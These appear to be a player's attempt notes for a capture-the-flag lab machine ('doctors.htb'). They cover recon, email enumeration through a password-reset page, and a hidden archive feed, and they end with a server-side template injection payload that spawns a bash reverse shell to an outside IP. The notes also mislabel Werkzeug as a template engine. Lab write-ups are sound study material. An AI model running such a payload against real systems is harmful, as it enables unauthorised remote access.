---ATTEMPTS---
all files are the same in 10.10.10.209/ (about, blog, contact and etc)
admin user was the one to publish posts on 10.10.10.209/blog.html
Splunk found in 10.10.10.209:8089 is probably a leaked user
login/pass is sended by a post request with USER:PASS base64ed in html field Authorization: Basic
found a email info@doctors.htb
checking for VHR (done!)
login page found
account creation enabled
( Your account has been created, with a time limit of twenty minutes! )
found a /post/1 page that was posted by admin
it is possible to find registered emails using the forgot password page (returns 500 if email exists or error message if doesnt)
http response header:
  Server: Werkzeug/1.0.1 Python/3.8
trying sql map in http://doctors.htb/home?page=1 (unsuccessful)
comment found in html: <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
the /archive dir:
  <?xml version="1.0" encoding="UTF-8" ?>
  <rss version="2.0">
  <channel>
    <title>Archive</title>
    <item><title>25</title></item>
  </channel>
    <item><title>asodfijaosidjf</title></item>
  </channel>
Werkzeug is a server-side template engine, and it is not sanitize to SSTI, as the title of the posts are written into the xml file in /archive, then everything is easy now
creating a SSTI with python code to run a reverse shell
the rshell was done like this:
  executing a rshell:
    {{ config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.153/8888 0>&1" ').read()}}
kudos!
